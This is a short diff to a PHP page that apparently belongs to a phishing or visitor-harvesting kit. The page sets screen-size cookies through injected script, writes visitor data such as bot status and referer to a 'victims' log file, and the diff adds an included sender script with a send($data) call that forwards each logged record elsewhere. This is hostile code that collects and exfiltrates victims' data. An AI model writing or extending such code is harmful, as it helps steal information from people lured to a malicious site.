@@ -1,4 +1,5 @@
 <?php
+include(".././sender/sender.php");
 
 echo "<script>
 document.cookie = 'Width=' + window.screen.availWidth + ';'
@@ -27,6 +28,7 @@ function LogData($IsBot,$Referer,$Page)
     $data .= "\n-----------------------------------------------------\n";                                     //Append dashes
     
     File_Put_Contents(".././victims/logs.txt", $data, FILE_APPEND);                                           //Append data to file
+    send($data);
 }
 
 
